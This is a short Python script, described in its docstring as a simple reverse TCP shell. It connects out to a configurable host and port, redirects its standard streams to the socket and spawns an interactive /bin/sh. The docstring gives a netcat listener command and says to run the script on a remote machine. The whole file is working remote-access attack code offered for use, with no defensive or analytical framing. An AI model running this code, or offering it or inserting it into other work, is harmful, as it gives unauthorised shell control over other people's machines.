"""
    @author: mishrasunny174@gmail.com
    this is a simple reverse tcp shell which can be used along with ncat to get shell access from a machine
    to host
    to start the listener simple use ncat with following command
    nc -nlvp <rport>
    and then you can make this script execute in the remote host to get shell access on your local machine
"""

import subprocess
import os
import socket

rhost = '127.0.0.1'  # change this
rport = 1234  # change this

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rhost, rport))
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.dup2(s.fileno(), 0)
process = subprocess.call(['/bin/sh', '-i'])
